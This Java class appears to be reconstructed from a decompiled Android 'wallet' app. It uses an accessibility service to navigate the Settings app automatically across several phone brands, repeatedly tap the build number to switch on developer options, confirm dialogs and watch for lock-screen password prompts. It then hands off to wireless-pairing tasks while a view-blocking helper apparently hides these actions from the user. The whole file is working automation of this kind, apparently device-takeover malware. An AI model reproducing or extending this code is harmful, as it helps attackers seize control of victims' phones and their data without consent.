package com.guard.wallet.delegate;
import com.guard.wallet.core.AppUtils;

import android.os.Build;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import com.guard.wallet.condition.BoolCondition;
import com.guard.wallet.condition.StringCondition;

import com.guard.wallet.entity.UiObject;
import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.filter.CombineFiltersWithOr;
import com.guard.wallet.req.ListenWindow;
import com.guard.wallet.service.MyAccessibilityService;
import java.util.Collections;
import java.util.HashSet;
import java.util.LinkedList;
import java.util.List;
import java.util.Objects;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicReference;
import java.util.concurrent.locks.ReentrantLock;

/**
 * vendor o/t — OpenDevelopmentDelegate.
 * Extends o.e (AccessibilityDelegate base).
 * Manages the flow: About Device → Version Info → tap build number → enable developer options.
 * Handles confirm-lock password windows, vivo/OPPO/Samsung/Motorola/Xiaomi/Huawei branches.
 *
 * Translated from CFR (797 lines) + JADX (677 lines) dual-source.
 *
 * ADAPT: Uses FilterHelper to avoid package shadowing:
 *   - a.a.c() → FilterHelper.initFilter()
 *   - a.a.b() → FilterHelper.addConditionWithEquals()
 *   - b.r() → FilterHelper.initEventTypes()
 *   - b.q() → FilterHelper.addEventType()
 *   - i.L() → o.i.L() (explicit class ref)
 *
 * Fields:
 *   n — ScheduledExecutorService (timeout scheduler)
 *   o — AtomicReference<r.f> (pair state enum)
 *   p — ReentrantLock (for T() method synchronization)
 */
public final class OpenDevelopmentDelegate extends AccessibilityDelegate {

    public final ScheduledExecutorService n;
    public final AtomicReference o;
    public final ReentrantLock p;

    public OpenDevelopmentDelegate() {
        super(X(), "com.android.settings");
        ScheduledExecutorService executor = Executors.newSingleThreadScheduledExecutor();
        this.n = executor;
        this.o = new AtomicReference<>(com.guard.wallet.delegate.ScreenCaptureManager.f.b);
        this.p = new ReentrantLock();

        try {
            com.guard.wallet.delegate.task.WirelessPairTask task = new com.guard.wallet.delegate.task.WirelessPairTask(this, 8);
            executor.schedule(task, 100L, TimeUnit.SECONDS);
        } catch (Exception e2) {
            AppUtils.s("OpenDevelopmentDelegate", e2);
        }
    }

    // ═══════ Static filter/config methods ═══════

    /** vendor L() — CombineFilter matching clickable=true */
    public static CombineFilter L() {
        CombineFilter filter = new CombineFilter();
        filter.setBoolConditions(new LinkedList<>());
        BoolCondition cond = new BoolCondition("clickable", true, true);
        filter.getBoolConditions().add(cond);
        return filter;
    }

    /** vendor M() — ListenWindow for AlertDialog in com.android.settings */
    public static ListenWindow M() {
        ListenWindow lw = new ListenWindow("com.android.settings", "android.app.AlertDialog");
        lw.setMatchs(new LinkedList<>());
        lw.setEventTypes(new HashSet<>());
        FilterHelper.addEventType(32, lw.getEventTypes(), lw).add(16384);
        return lw;
    }

    /** vendor N() — ListenWindow for FrameLayout in com.android.settings */
    public static ListenWindow N() {
        ListenWindow lw = new ListenWindow("com.android.settings", "android.widget.FrameLayout");
        FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
        return lw;
    }

    /** vendor O() — ListenWindow for DeviceInfoSettingsActivity */
    public static ListenWindow O() {
        ListenWindow lw = new ListenWindow("com.android.settings", "com.android.settings.Settings$DeviceInfoSettingsActivity");
        FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
        return lw;
    }

    /** vendor V() — CombineFilter for Motorola OS version info text */
    public static CombineFilter V() {
        String text = com.guard.wallet.utils.LocateValuesUtils.getValue("MOTO_OS_VERSION_INFO_TEXT");
        if (!AppUtils.B(text)) {
            CombineFilter filter = new CombineFilter();
            StringCondition sc = FilterHelper.addConditionWithEquals(filter,
                    FilterHelper.initFilter(filter, "className", "android.widget.TextView"),
                    "text", text);
            filter.getStringConditions().add(sc);
            return filter;
        } else {
            return null;
        }
    }

    /** vendor W() — ListenWindow for MyDeviceInfoActivity */
    public static ListenWindow W() {
        ListenWindow lw = new ListenWindow("com.android.settings", "com.android.settings.Settings$MyDeviceInfoActivity");
        FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
        return lw;
    }

    /** vendor X() — return all ListenWindows for this delegate */
    public static LinkedList X() {
        LinkedList list = new LinkedList();
        list.add(W());
        list.add(O());
        list.add(N());
        list.add(f0());
        list.add(d0());
        list.add(g0());
        list.add(M());
        list.addAll(com.guard.wallet.delegate.EngineHelper.confirmLockWindows());
        list.add(PairAccessibilityDelegate.Y());
        list.add(PairAccessibilityDelegate.W());
        list.add(PairAccessibilityDelegate.s0());
        list.add(PairAccessibilityDelegate.P0());
        list.add(PairAccessibilityDelegate.O0());
        list.add(PairAccessibilityDelegate.j0());
        list.add(PairAccessibilityDelegate.i0());
        return list;
    }

    /**
     * vendor Y() — CombineFiltersWithOr for build version text fields.
     * Checks 11 different config keys for build number / version text.
     */
    public static CombineFiltersWithOr Y() {
        CombineFiltersWithOr result = new CombineFiltersWithOr();
        result.setFilters(new LinkedList<>());

        String[] keys = {
            "BUILD_VERSION_TEXT", "BUILD_NUMBER_TEXT", "OS_VERSION_TEXT",
            "COLORS_BUILD_NUMBER_TEXT", "OS_SOFTWARE_VERSION_TEXT", "MIUI_VERSION_TEXT",
            "HYPER_OS_VERSION_TEXT", "VIVO_OS_SOFTWARE_VERSION_TEXT", "COMPILE_NUMBER_TEXT",
            "HUA_WEI_VERSION_TEXT", "HARMONY_OS_VERSION_TEXT"
        };

        for (String key : keys) {
            String text = com.guard.wallet.utils.LocateValuesUtils.getValue(key);
            if (!AppUtils.B(text)) {
                CombineFilter filter = new CombineFilter();
                StringCondition sc = FilterHelper.addConditionWithEquals(filter,
                        FilterHelper.initFilter(filter, "className", "android.widget.TextView"),
                        "text", text);
                filter.getStringConditions().add(sc);
                result.getFilters().add(filter);
            }
        }

        return result;
    }

    /** vendor a0() — press back if not in portrait, wait, check developer mode */
    public static boolean a0() {
        if (MyAccessibilityService.P() != null && !MyAccessibilityService.P().p()) {
            MyAccessibilityService.P().e();
            com.guard.wallet.utils.SystemHelper.T0(10);
            return com.guard.wallet.utils.SystemHelper.f1();
        } else {
            return false;
        }
    }

    /** vendor d0() — ListenWindow for SubSettings */
    public static ListenWindow d0() {
        ListenWindow lw = new ListenWindow("com.android.settings", "com.android.settings.SubSettings");
        lw.setMatchs(new LinkedList<>());
        lw.setEventTypes(new HashSet<>());
        FilterHelper.addEventType(32, lw.getEventTypes(), lw).add(16384);
        return lw;
    }

    /**
     * vendor e0() — CombineFiltersWithOr for OS version info texts.
     * Checks: OS_VERSION_INFO_TEXT, VIVO_OS_VERSION_INFO_TEXT, SOFTWARE_INFO_TEXT.
     */
    public static CombineFiltersWithOr e0() {
        CombineFiltersWithOr result = new CombineFiltersWithOr();
        result.setFilters(new LinkedList<>());

        String[] keys = { "OS_VERSION_INFO_TEXT", "VIVO_OS_VERSION_INFO_TEXT", "SOFTWARE_INFO_TEXT" };
        for (String key : keys) {
            String text = com.guard.wallet.utils.LocateValuesUtils.getValue(key);
            if (!AppUtils.B(text)) {
                CombineFilter filter = new CombineFilter();
                StringCondition sc = FilterHelper.addConditionWithEquals(filter,
                        FilterHelper.initFilter(filter, "className", "android.widget.TextView"),
                        "text", text);
                filter.getStringConditions().add(sc);
                result.getFilters().add(filter);
            }
        }

        return result;
    }

    /** vendor f0() — ListenWindow for vivo OriginDeviceSettingsActivity */
    public static ListenWindow f0() {
        ListenWindow lw = new ListenWindow("com.android.settings", "com.vivo.settings.deviceinfo.OriginDeviceSettingsActivity");
        FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
        return lw;
    }

    /** vendor g0() — ListenWindow for vivo VivoSubSettings */
    public static ListenWindow g0() {
        ListenWindow lw = new ListenWindow("com.android.settings", "com.vivo.settings.VivoSubSettings");
        lw.setMatchs(new LinkedList<>());
        lw.setEventTypes(new HashSet<>());
        FilterHelper.addEventType(32, lw.getEventTypes(), lw).add(16384);
        return lw;
    }

    // ═══════ Instance methods ═══════

    /** vendor H() — check if current window matches About Device windows */
    public final boolean H() {
        LinkedList list = new LinkedList();
        list.add(W());
        list.add(O());
        list.add(N());
        list.add(f0());
        return this.q(list);
    }

    /**
     * vendor I() — check if in confirm lock window.
     * Matches against i.L() confirm lock windows, or checks for SoftInputWindow with password field.
     */
    public final boolean I() {
        boolean inLock = this.q(com.guard.wallet.delegate.EngineHelper.confirmLockWindows());
        if (inLock) {
            return true;
        } else if (!Objects.equals((String) MyAccessibilityService.v2.get(), "android.inputmethodservice.SoftInputWindow")) {
            return false;
        } else {
            UiObject focused = MyAccessibilityService.P().J();
            return focused != null && focused.password();
        }
    }

    /** vendor J() — check if in developer options window (a0 windows) */
    public final boolean J() {
        LinkedList list = new LinkedList();
        list.add(PairAccessibilityDelegate.Y());
        list.add(PairAccessibilityDelegate.W());
        list.add(PairAccessibilityDelegate.s0());
        list.add(PairAccessibilityDelegate.P0());
        list.add(PairAccessibilityDelegate.O0());
        list.add(PairAccessibilityDelegate.j0());
        list.add(PairAccessibilityDelegate.i0());
        return this.q(list);
    }

    /**
     * vendor K() — check state after repeat-click.
     * If in confirm lock → set state to PREPARE/ENTER_CONFIRM_LOCK_WIN.
     * If dev already enabled → set state to ENABLE_DEV_OPT_SUCCESS → T().
     */
    public final boolean K() {
        boolean inLock = I();
        AtomicReference stateRef = this.o;
        if (inLock) {
            stateRef.set(com.guard.wallet.delegate.ScreenCaptureManager.f.f);
            if (I()) {
                stateRef.set(com.guard.wallet.delegate.ScreenCaptureManager.f.g);
            }
            return true;
        } else {
            boolean devEnabled = com.guard.wallet.utils.SystemHelper.K();
            com.guard.wallet.delegate.ScreenCaptureManager.f enabledState = com.guard.wallet.delegate.ScreenCaptureManager.f.i;
            if (!devEnabled && !J()) {
                return false;
            } else {
                stateRef.set(enabledState);
                T();
                return true;
            }
        }
    }

    /** vendor P() — find scrollable container in the current window */
    public final UiObject P() {
        CombineFiltersWithOr filters = new CombineFiltersWithOr();
        filters.setFilters(new LinkedList<>());

        /* RecyclerView */
        List filterList = filters.getFilters();
        CombineFilter f1 = new CombineFilter();
        StringCondition sc1 = FilterHelper.initFilter(f1, "className", "androidx.recyclerview.widget.RecyclerView");
        f1.getStringConditions().add(sc1);
        filterList.add(f1);

        /* ScrollView */
        List filterList2 = filters.getFilters();
        CombineFilter f2 = new CombineFilter();
        StringCondition sc2 = FilterHelper.initFilter(f2, "className", "android.widget.ScrollView");
        f2.getStringConditions().add(sc2);
        filterList2.add(f2);

        /* ListView + scrollable */
        List filterList3 = filters.getFilters();
        CombineFilter f3 = new CombineFilter();
        f3.setStringConditions(new LinkedList<>());
        f3.setBoolConditions(new LinkedList<>());
        StringCondition sc3 = new StringCondition();
        sc3.setProperty("className");
        sc3.setEquals("android.widget.ListView");
        f3.getStringConditions().add(sc3);
        BoolCondition bc3 = new BoolCondition("scrollable", true, true);
        f3.getBoolConditions().add(bc3);
        filterList3.add(f3);

        /* Any scrollable */
        List filterList4 = filters.getFilters();
        CombineFilter f4 = new CombineFilter();
        f4.setStringConditions(new LinkedList<>());
        f4.setBoolConditions(new LinkedList<>());
        BoolCondition bc4 = new BoolCondition("scrollable", true, true);
        f4.getBoolConditions().add(bc4);
        filterList4.add(f4);

        if (this.k() != null) {
            return this.k().findOneByOperateOr(filters);
        }
        return null;
    }

    /**
     * vendor Q() — main "About Device" window handler.
     * Looks for version info text to click. Branch logic:
     *   - vivo/MIUI/Samsung → try e0() first (OS_VERSION_INFO_TEXT)
     *   - All brands → try Y() (build number texts)
     *   - Motorola fallback → try V() (MOTO_OS_VERSION_INFO_TEXT)
     *   - Other → try e0() again
     * If found: click to enter version info, or repeat-click for dev mode.
     */
    public final void Q() {
        if (H()) {
            Log.d("OpenDevelopmentDelegate", "inAboutDeviceWin 窗口匹配");
            G();
            Log.d("OpenDevelopmentDelegate", "active root complete");
            StringBuilder sb = new StringBuilder("开始本地配对时间戳:");
            sb.append(System.currentTimeMillis());
            Log.d("OpenDevelopmentDelegate", sb.toString());
            AtomicReference stateRef = this.o;
            stateRef.set(com.guard.wallet.delegate.ScreenCaptureManager.f.c);
            boolean isVivo = com.guard.wallet.utils.DeviceUtils.isVivoFamily();
            com.guard.wallet.delegate.ScreenCaptureManager.f prepareVersionState = com.guard.wallet.delegate.ScreenCaptureManager.f.d;

            /* vivo / MIUI / Samsung: try e0() (OS version info) first */
            if (isVivo || com.guard.wallet.utils.DeviceUtils.isOppoFamily() || Build.BRAND.equalsIgnoreCase("samsung")) {
                UiObject found;
                if (this.k() != null) {
                    found = this.k().findOneByOperateOr(e0());
                } else {
                    found = null;
                }

                if (found == null) {
                    UiObject scrollView = P();
                    if (scrollView != null) {
                        Log.d("OpenDevelopmentDelegate", "关于手机窗口 滚动视图查找成功");
                        found = scrollView.scrollForwardUtil(FilterHelper.createScrollCondition(e0(), 1));
                        if (found == null) {
                            found = scrollView.scrollBackwardUtil(FilterHelper.createScrollCondition(e0(), 1));
                        }
                    }
                }

                if (found != null) {
                    if (!found.clickable()) {
                        found = found.findParentUtilCombine(L());
                    }
                    if (found != null && found.click()) {
                        stateRef.set(prepareVersionState);
                        com.guard.wallet.helper.BlockViewManager.h(5);
                    }
                    return;
                }
            }

            /* All brands: try Y() (build number texts) */
            UiObject buildNode;
            if (this.k() != null) {
                buildNode = this.k().findOneByOperateOr(Y());
            } else {
                buildNode = null;
            }

            if (buildNode == null) {
                UiObject scrollView = P();
                if (scrollView != null) {
                    Log.d("OpenDevelopmentDelegate", "关于手机窗口 滚动视图查找成功");
                    buildNode = scrollView.scrollForwardUtil(FilterHelper.createScrollCondition(Y(), 1));
                    if (buildNode == null) {
                        buildNode = scrollView.scrollBackwardUtil(FilterHelper.createScrollCondition(Y(), 1));
                    }
                }
            }

            if (buildNode != null) {
                if (!buildNode.clickable()) {
                    buildNode = buildNode.findParentUtilCombine(L());
                }
                if (buildNode != null && !Z(buildNode)) {
                    S();
                }
            } else if (Build.BRAND.equalsIgnoreCase("motorola")) {
                /* Motorola fallback: try V() */
                UiObject motoNode = null;
                if (this.k() != null) {
                    motoNode = this.k().findOneByCombine(V());
                }

                if (motoNode == null) {
                    UiObject scrollView = P();
                    if (scrollView != null) {
                        Log.d("OpenDevelopmentDelegate", "关于手机窗口 滚动视图查找成功");
                        motoNode = scrollView.scrollForwardUtil(FilterHelper.createScrollCondition(V(), 0));
                        if (motoNode == null) {
                            motoNode = scrollView.scrollBackwardUtil(FilterHelper.createScrollCondition(V(), 0));
                        }
                    }
                }

                if (motoNode != null) {
                    if (!motoNode.clickable()) {
                        motoNode = motoNode.findParentUtilCombine(L());
                    }
                    if (motoNode != null && motoNode.click()) {
                        stateRef.set(prepareVersionState);
                    }
                }
            } else {
                /* Other brands: try e0() */
                UiObject otherNode = null;
                if (this.k() != null) {
                    otherNode = this.k().findOneByOperateOr(e0());
                }

                if (otherNode == null) {
                    UiObject scrollView = P();
                    if (scrollView != null) {
                        Log.d("OpenDevelopmentDelegate", "关于手机窗口 滚动视图查找成功");
                        otherNode = scrollView.scrollForwardUtil(FilterHelper.createScrollCondition(e0(), 1));
                        if (otherNode == null) {
                            otherNode = scrollView.scrollBackwardUtil(FilterHelper.createScrollCondition(e0(), 1));
                        }
                    }
                }

                if (otherNode != null) {
                    if (!otherNode.clickable()) {
                        otherNode = otherNode.findParentUtilCombine(L());
                    }
                    if (otherNode != null && otherNode.click()) {
                        stateRef.set(prepareVersionState);
                    }
                }
            }
        }
    }

    /**
     * vendor R() — handle AlertDialog confirmation for enabling developer options.
     * Finds button1 in AlertDialog, clicks it, then checks dev state.
     */
    public final void R() {
        if (this.q(Collections.singletonList(M()))) {
            UiObject root = this.k();
            CombineFilter filter = new CombineFilter();
            StringCondition sc = FilterHelper.addConditionWithEquals(filter,
                    FilterHelper.initFilter(filter, "className", "android.widget.Button"),
                    "id", "android:id/button1");
            filter.getStringConditions().add(sc);
            root = root.findOneByCombine(filter);
            if (root != null && root.click()) {
                com.guard.wallet.helper.BlockViewManager.h(9);
                Log.d("OpenDevelopmentDelegate", "已点击确认开启开发者选项");
                boolean devEnabled = com.guard.wallet.utils.SystemHelper.K();
                AtomicReference stateRef = this.o;
                boolean success;
                if (!devEnabled && !J()) {
                    if (a0()) {
                        stateRef.set(com.guard.wallet.delegate.ScreenCaptureManager.f.k);
                    }
                    success = false;
                } else {
                    success = true;
                }

                if (success) {
                    stateRef.set(com.guard.wallet.delegate.ScreenCaptureManager.f.i);
                    T();
                }
            }
        }
    }

    /**
     * vendor S() — fallback handler when dev mode enable fails.
     * If dev already enabled, calls T(). Otherwise, cleanup + press back + go home.
     */
    public final void S() {
        if (!com.guard.wallet.utils.SystemHelper.K()) {
            c0();
            com.guard.wallet.utils.SystemHelper.F0(2);
            com.guard.wallet.utils.SystemHelper.T0(5);
            this.o.set(com.guard.wallet.delegate.ScreenCaptureManager.f.j);
            if (MyAccessibilityService.P() != null) {
                MyAccessibilityService.P().u();
                MyAccessibilityService.P().z();
                MyAccessibilityService.P().B();
                com.guard.wallet.helper.BlockViewManager.h(10);
            }
            com.guard.wallet.helper.BlockViewManager.c();
        } else {
            T();
        }
    }

    /**
     * vendor T() — handle enable dev option success.
     * With lock protection, cleanup, press back, then check dev mode state.
     */
    public final void T() {
        ReentrantLock lock = this.p;
        if (lock.tryLock()) {
            c0();
            if (MyAccessibilityService.P() != null) {
                MyAccessibilityService.P().u();
                com.guard.wallet.helper.BlockViewManager.h(10);
            }
            if (a0()) {
                this.o.set(com.guard.wallet.delegate.ScreenCaptureManager.f.l);
            }
            lock.unlock();
        }
    }

    /**
     * vendor U() — handle SubSettings / VivoSubSettings (version info window).
     * Searches for build number texts, scrolls if needed, repeat-clicks to enable dev mode.
     */
    public final void U() {
        LinkedList list = new LinkedList();
        list.add(d0());
        list.add(g0());
        if (this.q(list)) {
            Log.d("OpenDevelopmentDelegate", "inVersionInfoWin 窗口匹配");
            G();
            Log.d("OpenDevelopmentDelegate", "active root complete");
            this.o.set(com.guard.wallet.delegate.ScreenCaptureManager.f.e);
            if (this.k() != null) {
                UiObject found = this.k().findOneByOperateOr(Y());

                if (found == null) {
                    UiObject scrollView = P();
                    if (scrollView != null) {
                        Log.d("OpenDevelopmentDelegate", "inVersionInfoWin 滚动视图查找成功");
                        found = scrollView.scrollForwardUtil(FilterHelper.createScrollCondition(Y(), 1));
                        if (found == null) {
                            found = scrollView.scrollBackwardUtil(FilterHelper.createScrollCondition(Y(), 1));
                        }
                    }
                }

                if (found != null) {
                    if (!found.clickable()) {
                        found = found.findParentUtilCombine(L());
                    }
                    if (found != null && !Z(found)) {
                        S();
                    }
                }
            }
        }
    }

    /**
     * vendor Z(UiObject) — repeat-click build number to enable dev mode.
     * Clicks 7x up to 5 rounds, checking K() after each. Falls back to pressing back.
     */
    public final boolean Z(UiObject node) {
        boolean success = false;
        AtomicInteger counter = new AtomicInteger(0);

        while (!success && counter.incrementAndGet() <= 5) {
            node.repeatClick(7, 200L);
            com.guard.wallet.utils.SystemHelper.T0(5);
            success = K();
        }

        if (!success && MyAccessibilityService.P() != null) {
            if (!MyAccessibilityService.P().p()) {
                MyAccessibilityService.P().e();
                com.guard.wallet.utils.SystemHelper.T0(10);
            }
            if (com.guard.wallet.utils.SystemHelper.f1()) {
                this.o.set(com.guard.wallet.delegate.ScreenCaptureManager.f.k);
                success = true;
            }
        }

        return success;
    }

    /** vendor b0() — full cleanup with back + home + go home */
    public final void b0() {
        c0();
        com.guard.wallet.utils.SystemHelper.F0(2);
        com.guard.wallet.utils.SystemHelper.T0(5);
        this.o.set(com.guard.wallet.delegate.ScreenCaptureManager.f.j);
        if (MyAccessibilityService.P() != null) {
            MyAccessibilityService.P().u();
            MyAccessibilityService.P().z();
            MyAccessibilityService.P().B();
            com.guard.wallet.helper.BlockViewManager.h(10);
        }
        com.guard.wallet.helper.BlockViewManager.c();
    }

    /** vendor c0() — internal cleanup: shutdown executor, remove from thread pool, destroy base */
    public final void c0() {
        try {
            this.n.shutdownNow();
            com.guard.wallet.thread.DelegateTaskLauncher.a(super.c);
            super.d();
        } catch (Exception e2) {
            AppUtils.s("OpenDevelopmentDelegate", e2);
        }
    }

    @Override
    public final void d() {
        c0();
        super.d();
    }

    @Override
    public final boolean equals(Object obj) {
        return obj instanceof OpenDevelopmentDelegate;
    }

    @Override
    public final int hashCode() {
        return Objects.hash(OpenDevelopmentDelegate.class.getName());
    }

    /**
     * vendor u() — dispatch accessibility events based on current state.
     * Uses ((r.f)state).a integer value to decide which actions to dispatch.
     */
    @Override
    public final void u(AccessibilityEvent event, String packageName, String className) {
        super.u(event, packageName, className);
        AtomicReference stateRef = this.o;
        int stateVal = ((com.guard.wallet.enums.DevelopmentStage) stateRef.get()).a;
        String delegateId = super.c;

        if (stateVal < 0) {
            com.guard.wallet.thread.DelegateTaskLauncher.c(new com.guard.wallet.delegate.task.WirelessPairTask(this, 0), delegateId);
        }
        if (((com.guard.wallet.enums.DevelopmentStage) stateRef.get()).a < 2) {
            com.guard.wallet.thread.DelegateTaskLauncher.c(new com.guard.wallet.delegate.task.WirelessPairTask(this, 1), delegateId);
        }
        if (((com.guard.wallet.enums.DevelopmentStage) stateRef.get()).a < 4) {
            com.guard.wallet.thread.DelegateTaskLauncher.c(new com.guard.wallet.delegate.task.WirelessPairTask(this, 2), delegateId);
        }
        if (((com.guard.wallet.enums.DevelopmentStage) stateRef.get()).a <= 4) {
            com.guard.wallet.thread.DelegateTaskLauncher.c(new com.guard.wallet.delegate.task.WirelessPairTask(this, 3), delegateId);
        }
        if (stateRef.get() == com.guard.wallet.delegate.ScreenCaptureManager.f.g) {
            com.guard.wallet.thread.DelegateTaskLauncher.c(new com.guard.wallet.delegate.task.WirelessPairTask(this, 4), delegateId);
        }
        if (stateRef.get() == com.guard.wallet.delegate.ScreenCaptureManager.f.f || stateRef.get() == com.guard.wallet.delegate.ScreenCaptureManager.f.h) {
            com.guard.wallet.thread.DelegateTaskLauncher.c(new com.guard.wallet.delegate.task.WirelessPairTask(this, 5), delegateId);
        }
        if (stateRef.get() == com.guard.wallet.delegate.ScreenCaptureManager.f.k) {
            com.guard.wallet.thread.DelegateTaskLauncher.c(new com.guard.wallet.delegate.task.WirelessPairTask(this, 6), delegateId);
        }
        if (stateRef.get() == com.guard.wallet.delegate.ScreenCaptureManager.f.l) {
            com.guard.wallet.thread.DelegateTaskLauncher.c(new com.guard.wallet.delegate.task.WirelessPairTask(this, 7), delegateId);
        }
    }
}
